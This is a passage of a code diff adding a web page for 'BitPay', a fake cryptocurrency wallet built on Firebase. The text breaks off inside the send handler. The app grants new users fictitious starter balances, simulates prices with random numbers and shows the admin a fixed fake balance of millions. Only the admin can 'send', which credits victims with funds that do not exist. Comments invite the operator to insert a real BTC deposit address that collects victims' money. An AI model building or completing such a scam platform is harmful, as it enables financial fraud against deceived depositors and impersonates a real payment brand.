@@ -1,0 +1,528 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>BitPay</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,"Helvetica Neue",Arial,sans-serif;background:#0b0e11;color:#eaecef;min-height:100vh}
+::-webkit-scrollbar{width:4px}::-webkit-scrollbar-track{background:#181a20}::-webkit-scrollbar-thumb{background:#2b2f36;border-radius:2px}
+input,select{font-family:inherit}input::placeholder{color:#474d57}input:focus,select:focus{outline:none}
+button{font-family:inherit;cursor:pointer}button:active{opacity:.85}
+.screen{display:none}
+@keyframes fadeIn{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}
+@keyframes slideUp{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}
+@keyframes ticker{from{transform:translateX(0)}to{transform:translateX(-50%)}}
+@keyframes spin{to{transform:rotate(360deg)}}
+@keyframes toastIn{from{opacity:0;transform:translate(-50%,20px)}to{opacity:1;transform:translate(-50%,0)}}
+.ticker-wrap{background:#181a20;border-bottom:1px solid #2b2f36;overflow:hidden;height:28px;display:flex;align-items:center}
+.ticker-inner{display:flex;animation:ticker 32s linear infinite;white-space:nowrap}
+.ticker-text{font-size:11px;color:#848e9c;padding-right:80px}
+.topnav{background:#181a20;border-bottom:1px solid #2b2f36;padding:0 20px;display:flex;align-items:center;justify-content:space-between;height:56px;position:sticky;top:0;z-index:100}
+.logo{display:flex;align-items:center;gap:8px;font-size:18px;font-weight:700;color:#eaecef}
+.nav-tabs{display:flex;gap:2px}
+.tab-btn{background:transparent;border:none;border-bottom:2px solid transparent;color:#848e9c;padding:0 12px;height:56px;font-size:13px;transition:all .2s;position:relative;white-space:nowrap}
+.tab-btn.active{color:#f0b90b;border-bottom-color:#f0b90b;background:rgba(240,185,11,.06)}
+.tab-btn:hover{color:#eaecef}
+.nav-right{display:flex;align-items:center;gap:8px}
+.avatar{width:30px;height:30px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;color:#000;flex-shrink:0}
+.badge-admin{font-size:10px;background:rgba(240,185,11,.15);color:#f0b90b;border:1px solid rgba(240,185,11,.3);border-radius:4px;padding:2px 7px;font-weight:600;display:none}
+.inbox-badge{position:absolute;top:8px;right:2px;width:15px;height:15px;border-radius:50%;background:#f6465d;font-size:9px;font-weight:900;color:#fff;display:none;align-items:center;justify-content:center;pointer-events:none}
+.logout-btn{background:transparent;border:1px solid #2b2f36;border-radius:6px;padding:5px 10px;color:#848e9c;font-size:11px}
+.main{max-width:1060px;margin:0 auto;padding:24px 16px}
+.tab-panel{display:none;animation:fadeIn .35s ease}
+.card{background:#1e2026;border:1px solid #2b2f36;border-radius:14px;padding:22px}
+.card-sm{background:#181a20;border:1px solid #2b2f36;border-radius:10px;padding:14px}
+.hero{background:linear-gradient(120deg,#1a1d24,#1e2228);border:1px solid #2b2f36;border-radius:16px;padding:24px;margin-bottom:18px;position:relative;overflow:hidden}
+.hero::after{content:"";position:absolute;top:-60px;right:-60px;width:220px;height:220px;border-radius:50%;background:rgba(240,185,11,.04);border:1px solid rgba(240,185,11,.07);pointer-events:none}
+.grid-5{display:grid;grid-template-columns:repeat(5,1fr);gap:12px;margin-top:20px}
+.grid-4{display:grid;grid-template-columns:repeat(4,1fr);gap:12px}
+.grid-2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.grid-send{display:grid;grid-template-columns:1fr 1.6fr;gap:12px}
+.inp{width:100%;background:#181a20;border:1px solid #2b2f36;border-radius:8px;padding:14px 16px;color:#eaecef;font-size:14px;transition:border-color .2s}
+.inp:focus{border-color:#f0b90b}
+.lbl{font-size:13px;color:#848e9c;display:block;margin-bottom:8px;font-weight:500}
+.btn-primary{background:#f0b90b;border:none;border-radius:8px;padding:15px 0;width:100%;color:#000;font-weight:700;font-size:15px;transition:opacity .2s}
+.btn-primary:hover{opacity:.9}
+.btn-primary:disabled{background:#2b2f36;color:#848e9c;cursor:not-allowed}
+.btn-outline{background:transparent;border:1px solid #2b2f36;border-radius:7px;padding:8px 14px;color:#848e9c;font-size:12px}
+.err-box{font-size:12px;color:#f6465d;padding:8px 12px;background:rgba(246,70,93,.08);border:1px solid rgba(246,70,93,.2);border-radius:6px;margin-top:8px;display:none}
+.inbox-new{background:#1e2026;border:1px solid rgba(14,203,129,.3);border-radius:12px;padding:16px;display:flex;gap:14px;align-items:center;margin-bottom:10px;animation:slideUp .3s ease}
+.inbox-read{background:#1e2026;border:1px solid #2b2f36;border-radius:12px;padding:13px 16px;display:flex;gap:14px;align-items:center;margin-bottom:8px;opacity:.65}
+.deposit-addr{background:#181a20;border:1px solid rgba(240,185,11,.3);border-radius:10px;padding:18px;margin-top:14px}
+.addr-text{font-size:13px;color:#eaecef;word-break:break-all;letter-spacing:.04em;line-height:1.8;margin-bottom:14px;font-family:"Courier New",monospace}
+.copy-btn{display:flex;align-items:center;gap:7px;background:rgba(240,185,11,.1);border:1px solid rgba(240,185,11,.25);border-radius:7px;padding:8px 14px;color:#f0b90b;font-size:12px;font-weight:600;transition:all .2s}
+.copy-btn.done{background:rgba(14,203,129,.15);border-color:rgba(14,203,129,.35);color:#0ecb81}
+.price-card{background:#181a20;border:1px solid #2b2f36;border-radius:10px;padding:16px}
+.auth-wrap{min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
+.auth-card{width:100%;max-width:460px;background:#1e2026;border:1px solid #2b2f36;border-radius:16px;padding:36px;animation:fadeIn .35s ease}
+.auth-tabs{display:flex;background:#181a20;border-radius:8px;padding:3px;margin-bottom:22px}
+.auth-tab{flex:1;background:transparent;border:none;border-radius:6px;padding:9px 0;font-size:13px;font-weight:700;color:#848e9c;transition:all .18s}
+.auth-tab.active{background:#f0b90b;color:#000}
+.form-group{margin-bottom:18px}
+.spinner{width:18px;height:18px;border:2px solid rgba(0,0,0,.2);border-top-color:#000;border-radius:50%;animation:spin .6s linear infinite;display:inline-block;vertical-align:middle;margin-right:6px}
+#toast{display:none;position:fixed;bottom:24px;left:50%;transform:translateX(-50%);border:1px solid;border-radius:8px;padding:11px 20px;font-size:13px;z-index:999;white-space:nowrap;box-shadow:0 8px 32px rgba(0,0,0,.6)}
+.toast-in{animation:toastIn .3s ease}
+
+@media(max-width:768px){
+  .topnav{padding:0 12px;height:52px}
+  .logo span{display:none}
+  .nav-name{display:none!important}
+  .nav-tabs{gap:0}
+  .tab-btn{padding:0 8px;font-size:11px;height:52px}
+  .grid-5{grid-template-columns:repeat(2,1fr)}
+  .grid-4{grid-template-columns:repeat(2,1fr)}
+  .grid-2{grid-template-columns:1fr}
+  .grid-send{grid-template-columns:1fr}
+  .hero{padding:18px}
+  .main{padding:16px 12px}
+  .card{padding:16px}
+  .hero-bal{font-size:26px!important}
+}
+@media(max-width:480px){
+  .tab-btn{padding:0 6px;font-size:10px}
+  .logout-btn span{display:none}
+}
+</style>
+</head>
+<body>
+
+
+
+<!-- AUTH -->
+<div id="screen-auth" class="screen">
+  <div class="auth-wrap">
+    <div style="display:flex;align-items:center;gap:10px;margin-bottom:36px">
+      <svg width="36" height="36" viewBox="0 0 36 36" fill="none">
+        <path d="M18 2L22.5 6.5L14.5 14.5L10 10L18 2Z" fill="#f0b90b"/>
+        <path d="M25.5 9.5L30 14L22 22L17.5 17.5L25.5 9.5Z" fill="#f0b90b"/>
+        <path d="M10.5 9.5L15 14L7 22L2.5 17.5L10.5 9.5Z" fill="#f0b90b"/>
+        <path d="M18 17L22.5 21.5L18 26L13.5 21.5L18 17Z" fill="#f0b90b"/>
+      </svg>
+      <span style="font-size:26px;font-weight:700;color:#eaecef">BitPay</span>
+    </div>
+    <div class="auth-card">
+      <div class="auth-tabs">
+        <button class="auth-tab active" onclick="switchAuth('login')">Log In</button>
+        <button class="auth-tab" onclick="switchAuth('register')">Register</button>
+      </div>
+      <div id="form-login">
+        <div class="form-group"><label class="lbl">Email</label><input id="login-email" class="inp" type="email" placeholder="Enter your email" onkeydown="if(event.key==='Enter')handleLogin()"/></div>
+        <div class="form-group"><label class="lbl">Password</label><input id="login-pass" class="inp" type="password" placeholder="Enter your password" onkeydown="if(event.key==='Enter')handleLogin()"/></div>
+        <div id="login-err" class="err-box"></div>
+        <button class="btn-primary" onclick="handleLogin()" id="login-btn" style="margin-top:4px">Log In</button>
+        <div style="text-align:center;margin-top:16px;font-size:12px;color:#848e9c">Don't have an account? <span onclick="switchAuth('register')" style="color:#f0b90b;cursor:pointer;font-weight:600">Register</span></div>
+      </div>
+      <div id="form-register" style="display:none">
+        <div class="form-group"><label class="lbl">Full Name</label><input id="reg-name" class="inp" placeholder="Enter your full name"/></div>
+        <div class="form-group"><label class="lbl">Email Address</label><input id="reg-email" class="inp" type="email" placeholder="Enter your email address"/></div>
+        <div class="form-group"><label class="lbl">Password</label><input id="reg-pass" class="inp" type="password" placeholder="Min 6 characters"/></div>
+        <div class="form-group"><label class="lbl">Confirm Password</label><input id="reg-pass2" class="inp" type="password" placeholder="Re-enter your password" onkeydown="if(event.key==='Enter')handleRegister()"/></div>
+        <div id="reg-err" class="err-box"></div>
+        <button class="btn-primary" onclick="handleRegister()" style="margin-top:4px">Create Account</button>
+        <div style="text-align:center;margin-top:16px;font-size:12px;color:#848e9c">Already have an account? <span onclick="switchAuth('login')" style="color:#f0b90b;cursor:pointer;font-weight:600">Log In</span></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- APP -->
+<div id="screen-app" class="screen">
+  <div class="ticker-wrap">
+    <div class="ticker-inner">
+      <span class="ticker-text">BTC $94,210 | ETH $3,540 | BNB $612 | SOL $178 | XRP $0.5312 | ADA $0.4471 | DOGE $0.1623 | MATIC $0.8711</span>
+      <span class="ticker-text">BTC $94,210 | ETH $3,540 | BNB $612 | SOL $178 | XRP $0.5312 | ADA $0.4471 | DOGE $0.1623 | MATIC $0.8711</span>
+    </div>
+  </div>
+  <div class="topnav">
+    <div style="display:flex;align-items:center;gap:20px">
+      <div class="logo">
+        <svg width="24" height="24" viewBox="0 0 36 36" fill="none">
+          <path d="M18 2L22.5 6.5L14.5 14.5L10 10L18 2Z" fill="#f0b90b"/>
+          <path d="M25.5 9.5L30 14L22 22L17.5 17.5L25.5 9.5Z" fill="#f0b90b"/>
+          <path d="M10.5 9.5L15 14L7 22L2.5 17.5L10.5 9.5Z" fill="#f0b90b"/>
+          <path d="M18 17L22.5 21.5L18 26L13.5 21.5L18 17Z" fill="#f0b90b"/>
+        </svg>
+        <span>BitPay</span>
+      </div>
+      <div class="nav-tabs">
+        <button class="tab-btn active" data-tab="overview" onclick="setTab('overview')">Overview</button>
+        <button class="tab-btn" data-tab="wallet" onclick="setTab('wallet')">Wallet</button>
+        <button class="tab-btn" data-tab="send" id="nav-send-btn" onclick="setTab('send')" style="display:none">Send</button>
+        <button class="tab-btn" data-tab="inbox" onclick="setTab('inbox')">Inbox<span class="inbox-badge" id="inbox-badge"></span></button>
+      </div>
+    </div>
+    <div class="nav-right">
+      <span class="badge-admin" id="admin-badge">ADMIN</span>
+      <div class="avatar" id="nav-avatar">BP</div>
+      <span class="nav-name" id="nav-name" style="font-size:13px;color:#848e9c"></span>
+      <button class="logout-btn" onclick="handleLogout()"><span>Log Out</span></button>
+    </div>
+  </div>
+  <div class="main">
+
+    <!-- OVERVIEW -->
+    <div class="tab-panel" id="tab-overview">
+      <div class="hero">
+        <div style="font-size:12px;color:#848e9c;margin-bottom:8px;letter-spacing:.04em">Estimated Balance</div>
+        <div style="display:flex;align-items:baseline;gap:10px;margin-bottom:4px">
+          <span class="hero-bal" style="font-size:34px;font-weight:700;letter-spacing:-.02em" id="hero-total">$0.00</span>
+          <span style="font-size:15px;color:#848e9c">USD</span>
+        </div>
+        <div style="font-size:13px;color:#848e9c" id="hero-email"></div>
+        <div class="grid-5" id="balance-cards"></div>
+      </div>
+      <div class="card">
+        <div style="font-size:13px;font-weight:600;margin-bottom:16px">Market</div>
+        <div class="grid-4" id="market-cards"></div>
+      </div>
+    </div>
+
+    <!-- WALLET -->
+    <div class="tab-panel" id="tab-wallet">
+      <h2 style="font-size:22px;font-weight:700;margin-bottom:22px">Wallet</h2>
+      <div style="max-width:560px">
+        <!-- !! EDIT DEPOSIT ADDRESS: find DEPOSIT_ADDRESS in the script tag below !! -->
+        <div class="card" style="margin-bottom:16px">
+          <div style="font-size:13px;font-weight:600;margin-bottom:6px">BTC Deposit Address</div>
+          <div style="font-size:11px;color:#848e9c;margin-bottom:4px">Send BTC to this address to fund your account</div>
+          <div class="deposit-addr">
+            <div style="font-size:10px;color:#848e9c;letter-spacing:.1em;margin-bottom:10px">BITCOIN (BTC) NETWORK</div>
+            <div class="addr-text" id="display-addr">[Your BTC address goes here]</div>
+            <button class="copy-btn" id="copy-btn" onclick="copyAddress()">
+              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
+              Copy Address
+            </button>
+          </div>
+          <div class="grid-2" style="margin-top:12px">
+            <div class="card-sm"><div style="font-size:11px;color:#848e9c;margin-bottom:3px">Network</div><div style="font-size:12px;font-weight:600">Bitcoin (BTC)</div></div>
+            <div class="card-sm"><div style="font-size:11px;color:#848e9c;margin-bottom:3px">Min Deposit</div><div style="font-size:12px;font-weight:600">0.0001 BTC</div></div>
+            <div class="card-sm"><div style="font-size:11px;color:#848e9c;margin-bottom:3px">Confirmations</div><div style="font-size:12px;font-weight:600">3 required</div></div>
+            <div class="card-sm"><div style="font-size:11px;color:#848e9c;margin-bottom:3px">Arrival</div><div style="font-size:12px;font-weight:600">~10 minutes</div></div>
+          </div>
+        </div>
+        <div class="card">
+          <div style="font-size:13px;font-weight:600;margin-bottom:16px">Your Balances</div>
+          <div id="wallet-balances"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- SEND -->
+    <div class="tab-panel" id="tab-send">
+      <h2 style="font-size:22px;font-weight:700;margin-bottom:22px">Transfer Funds</h2>
+      <div style="max-width:500px">
+        <div class="card">
+          <div class="form-group">
+            <label class="lbl">Recipient Email</label>
+            <input id="send-email" class="inp" type="email" placeholder="user@example.com" oninput="onSendEmailChange()"/>
+            <div style="margin-top:5px;font-size:11px;color:#848e9c;min-height:16px" id="send-lookup-status"></div>
+            <div id="send-recipient-box" style="display:none;margin-top:8px;padding:10px 12px;border:1px solid #2b2f36;border-radius:8px;font-size:13px"></div>
+          </div>
+          <div class="grid-send" style="margin-bottom:14px">
+            <div><label class="lbl">Coin</label><select id="send-coin" class="inp" style="cursor:pointer" onchange="updateSendUSD()"><option>USDT</option><option>BTC</option><option>ETH</option><option>BNB</option><option>SOL</option></select></div>
+            <div><label class="lbl" id="send-amt-lbl">Amount</label><input id="send-amount" class="inp" type="number" placeholder="0.00" oninput="updateSendUSD()"/></div>
+          </div>
+          <div id="send-usd-est" style="display:none;background:#181a20;border-radius:8px;padding:11px;font-size:12px;color:#848e9c;margin-bottom:14px"></div>
+          <div class="form-group"><label class="lbl">Memo (optional)</label><input id="send-note" class="inp" placeholder="Add a note..."/></div>
+          <button class="btn-primary" onclick="handleSend()">Send Funds</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- INBOX -->
+    <div class="tab-panel" id="tab-inbox">
+      <h2 style="font-size:22px;font-weight:700;margin-bottom:22px" id="inbox-title">Inbox</h2>
+      <div id="inbox-list"><div style="background:#1e2026;border:1px solid #2b2f36;border-radius:14px;padding:48px;text-align:center;color:#848e9c;font-size:13px">No incoming transfers yet</div></div>
+    </div>
+
+  </div>
+</div>
+
+<div id="toast"></div>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, signOut, onAuthStateChanged, updateProfile } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
+import { getFirestore, doc, setDoc, getDoc, updateDoc, collection, addDoc, query, where, orderBy, onSnapshot, getDocs } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyAubv4HCEhdHjqCDo8kBhNQp_zSAr2ukKk",
+  authDomain: "bitpay-b3f73.firebaseapp.com",
+  projectId: "bitpay-b3f73",
+  storageBucket: "bitpay-b3f73.firebasestorage.app",
+  messagingSenderId: "425629573490",
+  appId: "1:425629573490:web:771b8f3a28097493297deb"
+};
+const fbApp = initializeApp(firebaseConfig);
+const auth = getAuth(fbApp);
+const db = getFirestore(fbApp);
+
+// !! EDIT YOUR DEPOSIT ADDRESS HERE !!
+const DEPOSIT_ADDRESS = "[Your BTC address goes here]";
+
+const ADMIN_EMAIL = "admin@bitpay.com";
+const STARTER = { USDT:50000, BTC:0.85, ETH:4.2, SOL:22.5, BNB:12 };
+const COINS = ["BTC","ETH","BNB","SOL","USDT"];
+let P = { BTC:94210, ETH:3540, SOL:178, BNB:612, USDT:1 };
+let currentUser=null, userData=null, myTxs=[], txUnsub=null, priceIv=null;
+let resolvedRecipient=null, lookupTimer=null;
+
+const $f = n => "$"+Number(n).toLocaleString("en-US",{minimumFractionDigits:2,maximumFractionDigits:2});
+const cf = (n,s) => `${Number(n).toFixed(s==="BTC"?5:s==="USDT"||s==="BNB"?2:3)} ${s}`;
+const ini = e => e.slice(0,2).toUpperCase();
+const avc = e => ["#f0b90b","#0ecb81","#1890ff","#a855f7","#ec4899","#14b8a6"][e.charCodeAt(0)%6];
+const isAdmin = () => currentUser?.email === ADMIN_EMAIL;
+
+// Admin always shows fixed large display balance that never changes
+const ADMIN_DISPLAY = { USDT:9850000, BTC:124.5, ETH:1840.2, SOL:42000, BNB:3200 };
+const getBal = c => isAdmin() ? ADMIN_DISPLAY[c] : (userData?.balances?.[c]||0);
+
+function toast(msg,type="ok"){
+  const t=document.getElementById("toast");
+  t.textContent=msg;
+  t.style.background=type==="err"?"#1a0c0e":"#0c1a14";
+  t.style.borderColor=type==="err"?"#f6465d":"#0ecb81";
+  t.style.color=type==="err"?"#f6465d":"#0ecb81";
+  t.style.display="block";
+  t.classList.remove("toast-in"); void t.offsetWidth; t.classList.add("toast-in");
+  setTimeout(()=>{t.style.display="none"},3500);
+}
+
+function showScreen(id){document.querySelectorAll(".screen").forEach(s=>s.style.display="none");document.getElementById(id).style.display="block";}
+
+window.setTab=function(name){
+  document.querySelectorAll(".tab-btn").forEach(b=>b.classList.toggle("active",b.dataset.tab===name));
+  document.querySelectorAll(".tab-panel").forEach(p=>p.style.display=p.id===`tab-${name}`?"block":"none");
+  if(name==="overview")renderOverview();
+  if(name==="wallet")renderWallet();
+  if(name==="send")renderSend();
+  if(name==="inbox")renderInbox();
+};
+
+function startPrices(){
+  if(priceIv)clearInterval(priceIv);
+  priceIv=setInterval(()=>{
+    P.BTC=+(P.BTC+(Math.random()-.5)*90).toFixed(2);
+    P.ETH=+(P.ETH+(Math.random()-.5)*18).toFixed(2);
+    P.SOL=+(P.SOL+(Math.random()-.5)*2.5).toFixed(2);
+    P.BNB=+(P.BNB+(Math.random()-.5)*4).toFixed(2);
+    const s=[`BTC ${$f(P.BTC)}`,`ETH ${$f(P.ETH)}`,`BNB ${$f(P.BNB)}`,`SOL ${$f(P.SOL)}`,`XRP $0.5312`,`ADA $0.4471`,`DOGE $0.1623`,`MATIC $0.8711`].join("   |   ");
+    document.querySelectorAll(".ticker-text").forEach(el=>el.textContent=s);
+    COINS.forEach(c=>{const el=document.getElementById(`price-${c}`);if(el)el.textContent=$f(P[c]||1);});
+    if(!isAdmin()){
+      const he=document.getElementById("hero-total");
+      if(he){const tot=Object.entries(userData?.balances||{}).reduce((s,[c,a])=>s+a*(P[c]||1),0);he.textContent=$f(tot);}
+    }
+  },2000);
+}
+
+onAuthStateChanged(auth,async user=>{
+  currentUser=user;
+  if(user){
+    const snap=await getDoc(doc(db,"users",user.uid));
+    if(snap.exists())userData=snap.data();
+    document.getElementById("nav-name").textContent=userData?.name||user.displayName||user.email;
+    const av=document.getElementById("nav-avatar");
+    av.textContent=ini(user.email);av.style.background=avc(user.email);
+    document.getElementById("admin-badge").style.display=isAdmin()?"inline-block":"none";
+    // Only admin sees Send tab
+    document.getElementById("nav-send-btn").style.display=isAdmin()?"inline-flex":"none";
+    document.getElementById("display-addr").textContent=DEPOSIT_ADDRESS;
+    showScreen("screen-app");
+    startPrices();
+    subscribeTransactions();
+    setTab("overview");
+  } else {
+    if(priceIv)clearInterval(priceIv);
+    if(txUnsub)txUnsub();
+    showScreen("screen-auth");
+  }
+});
+
+function subscribeTransactions(){
+  if(txUnsub)txUnsub();
+  const q=query(collection(db,"transactions"),where("participants","array-contains",currentUser.email),orderBy("time","desc"));
+  txUnsub=onSnapshot(q,snap=>{
+    myTxs=snap.docs.map(d=>({id:d.id,...d.data()}));
+    updateInboxBadge();
+    const active=document.querySelector(".tab-btn.active")?.dataset?.tab;
+    if(active==="inbox")renderInbox();
+  });
+}
+
+function updateInboxBadge(){
+  const n=myTxs.filter(t=>t.to===currentUser.email&&!t.read).length;
+  const b=document.getElementById("inbox-badge");
+  if(n>0){b.textContent=n;b.style.display="flex";}else{b.style.display="none";}
+}
+
+function renderOverview(){
+  const bals=isAdmin()?ADMIN_DISPLAY:(userData?.balances||{});
+  const tot=Object.entries(bals).reduce((s,[c,a])=>s+a*(P[c]||1),0);
+  document.getElementById("hero-total").textContent=$f(tot);
+  document.getElementById("hero-email").textContent=currentUser.email;
+  document.getElementById("balance-cards").innerHTML=COINS.map(c=>{
+    const b=getBal(c);
+    return`<div class="card-sm"><div style="font-size:11px;color:${c==="BTC"?"#f0b90b":"#848e9c"};font-weight:600;margin-bottom:6px">${c}</div><div style="font-size:15px;font-weight:700">${cf(b,c)}</div><div style="font-size:11px;color:#848e9c;margin-top:3px">${$f(b*(P[c]||1))}</div></div>`;
+  }).join("");
+  document.getElementById("market-cards").innerHTML=["BTC","ETH","BNB","SOL"].map(c=>{
+    const chg=((Math.random()-.48)*5).toFixed(2);
+    const pos=parseFloat(chg)>=0;
+    return`<div class="price-card"><div style="font-size:12px;color:#848e9c;margin-bottom:8px">${c}/USDT</div><div id="price-${c}" style="font-size:20px;font-weight:700">${$f(P[c])}</div><div style="font-size:12px;color:${pos?"#0ecb81":"#f6465d"};margin-top:4px">${pos?"&#9650;":"&#9660;"} ${Math.abs(chg)}%</div></div>`;
+  }).join("");
+}
+
+function renderWallet(){
+  document.getElementById("display-addr").textContent=DEPOSIT_ADDRESS;
+  document.getElementById("wallet-balances").innerHTML=COINS.map(c=>{
+    const b=getBal(c);
+    return`<div style="display:flex;justify-content:space-between;align-items:center;padding:12px 0;border-bottom:1px solid #2b2f36"><div style="display:flex;align-items:center;gap:12px"><div style="width:36px;height:36px;border-radius:9px;background:${c==="BTC"?"rgba(240,185,11,.12)":"rgba(24,144,255,.1)"};display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:700;color:${c==="BTC"?"#f0b90b":"#1890ff"}">${c[0]}</div><div><div style="font-size:13px;font-weight:600">${c}</div><div style="font-size:11px;color:#848e9c">${$f(P[c]||1)}</div></div></div><div style="text-align:right"><div style="font-size:14px;font-weight:700">${cf(b,c)}</div><div style="font-size:11px;color:#848e9c">${$f(b*(P[c]||1))}</div></div></div>`;
+  }).join("");
+}
+
+function renderSend(){
+  const coin=document.getElementById("send-coin")?.value||"USDT";
+  const lbl=document.getElementById("send-amt-lbl");
+  if(lbl)lbl.textContent=isAdmin()?"Amount":`Amount · ${cf(getBal(coin),coin)} available`;
+}
+
+window.updateSendUSD=function(){
+  const amt=parseFloat(document.getElementById("send-amount").value);
+  const coin=document.getElementById("send-coin").value;
+  const el=document.getElementById("send-usd-est");
+  renderSend();
+  if(!isNaN(amt)&&amt>0){el.style.display="block";el.textContent=`≈ ${$f(amt*(P[coin]||1))} USD`;}
+  else el.style.display="none";
+};
+
+function renderInbox(){
+  const received=myTxs.filter(t=>t.to===currentUser.email);
+  const unread=received.filter(t=>!t.read);
+  document.getElementById("inbox-title").innerHTML=`Inbox${unread.length>0?` <span style="font-size:14px;color:#f6465d;font-weight:600">· ${unread.length} new</span>`:""}`;
+  const el=document.getElementById("inbox-list");
+  if(!received.length){el.innerHTML=`<div style="background:#1e2026;border:1px solid #2b2f36;border-radius:14px;padding:48px;text-align:center;color:#848e9c;font-size:13px">No incoming transfers yet</div>`;return;}
+  el.innerHTML=[
+    ...unread.map(tx=>`<div class="inbox-new"><div style="width:40px;height:40px;border-radius:10px;background:rgba(14,203,129,.1);border:1px solid rgba(14,203,129,.25);display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0">↓</div><div style="flex:1"><div style="font-size:13px;font-weight:600;color:#0ecb81">Received from ${tx.fromName}</div><div style="font-size:11px;color:#848e9c">${tx.from} · ${new Date(tx.time).toLocaleString()}</div>${tx.note?`<div style="font-size:11px;color:#848e9c;font-style:italic;margin-top:2px">"${tx.note}"</div>`:""}</div><div style="text-align:right;flex-shrink:0"><div style="font-size:15px;font-weight:700;color:#0ecb81">+${cf(tx.amount,tx.coin)}</div><div style="font-size:11px;color:#848e9c">${$f(tx.usd)}</div><button class="btn-outline" style="margin-top:6px;font-size:10px" onclick="markRead('${tx.id}')">Dismiss</button></div></div>`),
+    ...received.filter(t=>t.read).map(tx=>`<div class="inbox-read"><div style="width:36px;height:36px;border-radius:10px;background:rgba(14,203,129,.06);display:flex;align-items:center;justify-content:center;font-size:16px;color:#0ecb81;flex-shrink:0">↓</div><div style="flex:1"><div style="font-size:12px;font-weight:600;color:#848e9c">From ${tx.fromName}</div><div style="font-size:11px;color:#848e9c">${new Date(tx.time).toLocaleString()}</div>${tx.note?`<div style="font-size:11px;color:#848e9c;font-style:italic">"${tx.note}"</div>`:""}</div><div style="text-align:right;flex-shrink:0"><div style="font-size:13px;font-weight:700">+${cf(tx.amount,tx.coin)}</div><div style="font-size:11px;color:#848e9c">${$f(tx.usd)}</div></div></div>`)
+  ].join("");
+}
+
+window.switchAuth=function(mode){
+  document.querySelectorAll(".auth-tab").forEach((b,i)=>b.classList.toggle("active",(i===0&&mode==="login")||(i===1&&mode==="register")));
+  document.getElementById("form-login").style.display=mode==="login"?"block":"none";
+  document.getElementById("form-register").style.display=mode==="register"?"block":"none";
+};
+
+window.handleLogin=async function(){
+  const email=document.getElementById("login-email").value.trim();
+  const pass=document.getElementById("login-pass").value;
+  const err=document.getElementById("login-err");
+  err.style.display="none";
+  if(!email||!pass){err.textContent="Enter email and password";err.style.display="block";return;}
+  const btn=document.getElementById("login-btn");
+  btn.innerHTML=`<span class="spinner"></span>Signing in...`;btn.disabled=true;
+  try{await signInWithEmailAndPassword(auth,email,pass);}
+  catch(e){err.textContent="Invalid email or password";err.style.display="block";btn.innerHTML="Log In";btn.disabled=false;}
+};
+
+window.handleRegister=async function(){
+  const name=document.getElementById("reg-name").value.trim();
+  const email=document.getElementById("reg-email").value.trim();
+  const pass=document.getElementById("reg-pass").value;
+  const pass2=document.getElementById("reg-pass2").value;
+  const err=document.getElementById("reg-err");
+  err.style.display="none";
+  if(!name||!email||!pass||!pass2){err.textContent="All fields required";err.style.display="block";return;}
+  if(pass.length<6){err.textContent="Password min 6 characters";err.style.display="block";return;}
+  if(pass!==pass2){err.textContent="Passwords do not match";err.style.display="block";return;}
+  try{
+    const cred=await createUserWithEmailAndPassword(auth,email,pass);
+    await updateProfile(cred.user,{displayName:name});
+    await setDoc(doc(db,"users",cred.user.uid),{email:email.toLowerCase(),name,wallet:"",balances:{...STARTER},createdAt:Date.now()});
+    toast(`Welcome, ${name}!`);
+  }catch(e){err.textContent=e.code==="auth/email-already-in-use"?"Email already registered":e.message;err.style.display="block";}
+};
+
+window.handleLogout=async function(){
+  if(priceIv)clearInterval(priceIv);if(txUnsub)txUnsub();
+  currentUser=null;userData=null;myTxs=[];
+  await signOut(auth);
+};
+
+window.onSendEmailChange=function(){
+  const val=document.getElementById("send-email").value.trim().toLowerCase();
+  const box=document.getElementById("send-recipient-box");
+  resolvedRecipient=null;box.style.display="none";clearTimeout(lookupTimer);
+  document.getElementById("send-lookup-status").textContent="";
+  if(!val||!val.includes("@"))return;
+  if(val===currentUser.email){
+    box.innerHTML=`<span style="color:#f6465d;font-size:12px">✕ Cannot send to yourself</span>`;
+    box.style.display="block";box.style.borderColor="rgba(246,70,93,.2)";box.style.background="rgba(246,70,93,.06)";return;
+  }
+  document.getElementById("send-lookup-status").textContent="Searching...";
+  lookupTimer=setTimeout(async()=>{
+    document.getElementById("send-lookup-status").textContent="";
+    const q=query(collection(db,"users"),where("email","==",val));
+    const snap=await getDocs(q);
+    if(snap.empty){
+      box.innerHTML=`<span style="color:#f6465d;font-size:12px">✕ Account not found</span>`;
+      box.style.display="block";box.style.borderColor="rgba(246,70,93,.2)";box.style.background="rgba(246,70,93,.06)";
+    } else {
+      const u=snap.docs[0].data();
+      resolvedRecipient={email:val,name:u.name,uid:snap.docs[0].id};
+      box.innerHTML=`<div style="display:flex;align-items:center;gap:8px"><div style="width:28px;height:28px;border-radius:50%;background:${avc(val)};display:flex;align-items:center;justify-content:center;font-size:10px;font-weight:700;color:#000">${ini(val)}</div><div><div style="font-size:13px;font-weight:600;color:#0ecb81">✓ ${u.name}</div><div style="font-size:11px;color:#848e9c">${val}</div></div></div>`;
+      box.style.display="block";box.style.borderColor="rgba(14,203,129,.2)";box.style.background="rgba(14,203,129,.06)";
+    }
+  },600);
+};
+
+window.handleSend=async function(){
